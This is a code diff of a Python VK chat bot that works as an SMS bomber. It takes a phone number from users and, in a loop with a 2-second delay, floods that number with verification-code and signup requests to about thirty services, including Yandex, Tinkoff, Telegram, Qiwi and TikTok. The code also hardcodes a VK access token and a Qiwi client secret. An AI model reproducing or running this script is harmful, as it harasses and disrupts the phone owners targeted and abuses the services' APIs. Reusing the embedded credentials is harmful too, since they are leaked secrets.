@@ -28,12 +28,26 @@ try:
         file.close()
 
 
+    def checkk(x):
+        file = open('bazan.txt', 'r', encoding='utf-8')
+        if str(x) in file.read():
+            return 1
+        else:
+            return 0
+        file.close()
+
     def extract_arg(arg):
         return arg.split()[1]
 
 
     def adder(x):
         file = open('baza.txt', 'a', encoding='utf-8')
+        file.write(f'{x}\n')
+
+        file.close()
+
+    def adderr(x):
+        file = open('bazan.txt', 'a', encoding='utf-8')
         file.write(f'{x}\n')
 
         file.close()
@@ -72,20 +86,18 @@ try:
 
     def spam():
         while True:
-            time.sleep(10)
-            UsersId = open("baza.txt", "r")
-            UsersId2 = set()
-            for line in UsersId:
-                UsersId2.add(line.strip())
-            UsersId.close()
-
-            suser = []
-            for user in UsersId2:
-                suser.append(str(user))
-
+            time.sleep(2)
             o = 0
-            for user in suser:
+            UsersIdd = open("bazan.txt", "r")
+            UsersIdd2 = set()
+            for line in UsersIdd:
+                UsersIdd2.add(line.strip())
+            UsersIdd.close()
 
+            suserr = []
+            for user in UsersIdd2:
+                suserr.append(str(user))
+            for user in suserr:
                 try:
                     userr = str(open(str(user) + "phone.txt", "r").read())
                     a = open(str(user) + "c.txt", "w")
@@ -103,7 +115,7 @@ try:
                             requests.post(
                                 "https://api.delitime.ru/api/v2/signup",
                                 data={
-                                    "SignupForm[username]": phone,
+                                    "SignupForm[username]": userr,
                                     "SignupForm[device_type]": 3,
                                 },
                             )
@@ -111,7 +123,7 @@ try:
                         except:
                             pass
                         try:
-                            a = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/",
+                            a = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + userr + "/",
                                               headers=headers)
                             print(colored('citilink-[+]', 'green'))
                         except:
@@ -119,7 +131,7 @@ try:
                         try:
                             a = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
                                               json={"reqId": "91101-1606335718",
-                                                    "params": {"phone": phone, "language": "ru-RU", "route": "sms",
+                                                    "params": {"phone": userr, "language": "ru-RU", "route": "sms",
                                                                "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}},
                                               headers=headers)
                             print(colored('icq-[+]', 'yellow'))
@@ -128,33 +140,33 @@ try:
                         try:
                             requests.post(
                                 "https://www.dns-shop.ru/order/order-single-page/check-and-initiate-phone-confirmation/",
-                                data={"phone": phone, "is_repeat": 0, "order_guid": 1},
+                                data={"phone": userr, "is_repeat": 0, "order_guid": 1},
                             )
                             print(colored('dns-shop.ru-[+]', 'magenta'))
                         except:
                             print(colored('dns-shop.ru-[-]', 'magenta'))
                         try:
                             a = requests.post("https://lenta.com/api/v1/registration/requestValidationCode",
-                                              json={"phone": "+" + phone}, headers=headers)
+                                              json={"phone": "+" + userr}, headers=headers)
                             print(colored('lenta.com-[+]', 'blue'))
                         except:
                             print(colored('lenta.com-[-]', 'blue'))
                         try:
                             a = requests.post("https://taxi.yandex.ru/3.0/auth",
-                                              json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": phone},
+                                              json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": userr},
                                               headers=headers)
                             print(colored('taxi.yandex-[+]', 'cyan'))
                         except:
                             print(colored('taxi.yandex-[-]', 'cyan'))
                         try:
                             a = requests.post("https://youla.ru/web-api/auth/request_code",
-                                              json={"phone": phone}, headers=headers)
+                                              json={"phone": userr}, headers=headers)
                             print(colored('youla-[+]', 'magenta'))
                         except:
                             print(colored('youla-[-]', 'magenta'))
                         try:
                             a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
-                                "msisdn": phone,
+                                "msisdn": userr,
                                 "locale": "en",
                                 "countryCode": "ru",
                                 "version": "1",
@@ -166,32 +178,32 @@ try:
                             print(colored('icq.com-[-]', 'cyan'))
                         try:
                             a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
-                                              json={"phone_number": phone}, headers=headers)
+                                              json={"phone_number": userr}, headers=headers)
                             print(colored('eda.yandex-[+]', 'yellow'))
                         except:
                             print(colored('eda.yandex-[-]', 'yellow'))
                         try:
                             a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
-                                              data={"phone": phone}, headers=headers)
+                                              data={"phone": userr}, headers=headers)
                             print(colored('shop.vsk-[+]', 'green'))
                         except:
                             print(colored('shop.vsk-[-]', 'green'))
                         try:
                             a = requests.post(
                                 "https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
-                                data={"st.r.phone": "+" + phone}, headers=headers)
+                                data={"st.r.phone": "+" + userr}, headers=headers)
                             print(colored('ok.ru-[+]', 'blue'))
                         except:
                             print(colored('ok.ru-[-]', 'blue'))
                         try:
                             a = requests.post("https://nn-card.ru/api/1.0/register",
-                                              json={"phone": phone, "password": 'DDd7873456'}, headers=headers)
+                                              json={"phone": userr, "password": 'DDd7873456'}, headers=headers)
                             print(colored('nn-card-[+]', 'cyan'))
                         except:
                             print(colored('nn-card-[-]', 'cyan'))
                         try:
                             a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
-                                              json={"CellPhone": phone[1:]}, headers=headers)
+                                              json={"CellPhone": userr[1:]}, headers=headers)
                             print(colored('my.modulbank-[+]', 'cyan'))
                         except:
                             print(colored('my.modulbank-[-]', 'cyan'))
@@ -199,7 +211,7 @@ try:
                             a = requests.post(
                                 "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
 
-                                data={"phone": "+" + phone}, headers=headers)
+                                data={"phone": "+" + userr}, headers=headers)
                             print(colored('tinkoff-[+]', 'yellow'))
                         except:
                             print(colored('tinkoff-[-]', 'yellow'))
@@ -207,34 +219,34 @@ try:
                             a = requests.post(
                                 "https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",
 
-                                data={"l": phone[1:]}, headers=headers)
+                                data={"l": userr[1:]}, headers=headers)
                             print(colored('rutaxi-[+]', 'green'))
                         except:
                             print(colored('rutaxi-[-]', 'green'))
                         try:
                             a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
-                                              data={"CellPhone": phone[1:]}, headers=headers)
+                                              data={"CellPhone": userr[1:]}, headers=headers)
                             print(colored('modulbank-[+]', 'magenta'))
                         except:
                             print(colored('modulbank-[-]', 'magenta'))
                         try:
                             a = requests.post("https://ng-api.webbankir.com/user/v2/create",
                                               json={"lastName": "уцвцу", "firstName": "цувцу", "middleName": "цуацуа",
-                                                    "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""},
+                                                    "mobilePhone": userr, "email": "asadsd@mail.ru", "smsCode": ""},
                                               headers=headers)
                             print(colored('webbankir-[+]', 'magenta'))
                         except:
                             print(colored('webbankir-[-]', 'magenta'))
                         try:
                             a = requests.post("https://stavropol.sushi-market.com/sendForm/callMeBack",
-                                              json={"phone": phone[1:], "name": "Егор"}, headers=headers)
+                                              json={"phone": userr[1:], "name": "Егор"}, headers=headers)
                             print(colored('stavropol-[+]', 'yellow'))
                         except:
                             print(colored('stavropol-[-]', 'yellow'))
                         try:
                             a = requests.post("https://m.tiktok.com/node-a/send/download_link",
                                               json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7",
-                                                    "Mobile": phone[1:],
+                                                    "Mobile": userr[1:],
                                                     "page": {"pageName": "home", "launchMode": "direct",
                                                              "trafficType": ""}},
                                               headers=headers)
@@ -243,7 +255,7 @@ try:
                             print(colored('tiktok-[-]', 'yellow'))
                         try:
                             a = requests.post("https://api.sunlight.net/v3/customers/authorization/",
-                                              data={"phone": phone},
+                                              data={"phone": userr},
                                               headers=headers)
                             print(colored('sunlight-[+]', 'cyan'))
                         except:
@@ -251,7 +263,7 @@ try:
                         try:
                             a = requests.post("https://cloud.mail.ru/api/v2/notify/applink",
                                               json={
-                                                  "phone": "+" + phone,
+                                                  "phone": "+" + userr,
                                                   "api": 2,
                                                   "email": 'dgirherfib@gmaqil.com',
                                                   "x-email": "x-email",
@@ -263,7 +275,7 @@ try:
                             a = requests.post("https://mobile-api.qiwi.com/oauth/authorize",
                                               data={
                                                   "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
-                                                  "username": phone,
+                                                  "username": userr,
                                                   "client_id": "android-qw",
                                                   "client_secret": "zAm4FKq9UnSe7id",
                                               }, headers=headers)
@@ -272,7 +284,7 @@ try:
                             print(colored('qiwi-[-]', 'magenta'))
                         try:
                             a = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
-                                              json={"phone": "+" + phone}, headers=headers)
+                                              json={"phone": "+" + userr}, headers=headers)
                             print(colored('tiktok-[+]', 'yellow'))
                         except:
                             print(colored('tiktok-[-]', 'yellow'))
@@ -283,7 +295,7 @@ try:
                                                   "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                                                   "include_verification_code": True,
                                                   "password": 'Danil5564554',
-                                                  "phone_number": phone,
+                                                  "phone_number": userr,
                                                   "username": 'bhtrtrrrtbhtrbhtr',
                                               }, headers=headers)
                             print(colored('twitch.tv-[+]', 'yellow'))
@@ -291,33 +303,42 @@ try:
                             print(colored('twitch.tv-[-]', 'yellow'))
                         try:
                             a = requests.post("https://my.telegram.org/auth/send_password",
-                                              data={"phone": "+" + phone}, headers=headers)
+                                              data={"phone": "+" + userr}, headers=headers)
                             print(colored('telegram-[+]', 'magenta'))
                         except:
                             print(colored('telegram-[-]', 'magenta'))
                         try:
                             a = requests.post(
                                 'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
-                                params={'msisdn': phone}, headers=headers)
+                                params={'msisdn': userr}, headers=headers)
                             print(colored('mts.ru-[+]', 'cyan'))
                         except:
                             print(colored('mts.ru-[-]', 'cyan'))
+                    suserr.remove(str(user))
 
+                    file = open('bazan.txt', 'w')
+                    file.close()
+
+                    for s in suserr:
+                        file = open('bazan.txt', 'a', encoding='utf-8')
+                        file.write(f'{s}\n')
+                        file.close()
                     file = pathlib.Path(f"{user}phone.txt")
                     file.unlink()
                     stat1()
                     o = 0
+
                 except:
                     pass
 
 
     def write_message(sender, message):
-        if i == 1:
+        if i == 0:
             authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                                'keyboard': keyboard.get_keyboard()})
-        if i == 2:
+        if i == 1:
             authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
-                                               'keyboard': clava2.get_keyboard()})
+                                               'keyboard': clava1.get_keyboard()})
 
 
     def rass(soob, xui, govno, jopa):
@@ -359,8 +380,8 @@ try:
         a.close()
 
 
-    t = threading.Thread(target=spam)
-    t.start()
+    d = threading.Thread(target=spam)
+    d.start()
 
     token = "f1633eeaccf588d2b2269ec109b63b783581433648776d838a7514b53a9448909664c942251b058138eae"
     authorize = vk_api.VkApi(token=token)
@@ -412,20 +433,7 @@ try:
                         i = int(i)
                     write_message(sender, "Привет " + name + "! \nРады видеть тебя в нашей группе 😇")
                     write_message(sender, "Выбери:")
-                elif reseived_message[0:3] == 'бан' and sender == admin:
-                    bba = extract_arg(reseived_message)
-                    a = open(str(bba) + "ban.txt", "w")
-                    a.write("0")
-                    a.close()
-                    write_message(str(bba), 'Ваш аккаунт заблокирован !!!')
-                    write_message(sender, 'Аккаунт разблокирован !!!')
-                elif reseived_message[0:4] == 'абан' and sender == admin:
-                    bba = extract_arg(reseived_message)
-                    a = open(str(bba) + "ban.txt", "w")
-                    a.write("1")
-                    a.close()
-                    write_message(str(bba), 'Ваш аккаунт разблокирован !!!')
-                    write_message(sender, 'Аккаунт разблокирован !!!')
+                    threading
                 elif reseived_message[0:10] == 'статистика':
                     with open("baal.txt", "r") as baa:
                         baal = baa.read()
@@ -467,6 +475,8 @@ try:
                         a = open(str(event.user_id) + "phone.txt", "w")
                         a.write(phone)
                         a.close()
+                        if checkk(sender) == 0:
+                            adderr(sender)
                         write_message(sender, 'Ждите вашей очереди!')
 
                 elif reseived_message[0:5] == 'назад':
